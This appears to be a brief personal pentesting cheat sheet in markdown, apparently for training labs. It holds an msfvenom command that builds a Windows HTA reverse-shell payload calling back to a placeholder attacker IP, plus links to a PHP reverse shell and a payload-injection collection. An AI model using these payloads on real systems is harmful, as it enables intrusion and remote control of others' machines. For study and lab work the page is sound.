---
template: overrides/blog.html
icon: material/plus-circle
title: Cheat sheet
description: >
  
search:
  exclude: true
hide:
  - feedback

links:
  - setup/setting-up-site-search.md#built-in-search-plugin
  - insiders/index.md#how-to-become-a-sponsor

---

# __Cheat sheet__

---

## __Reverse shell__

### __HTA__

```PS1 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta
```

### __PHP__

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

## __Payload Injection__

https://github.com/swisskyrepo/PayloadsAllTheThings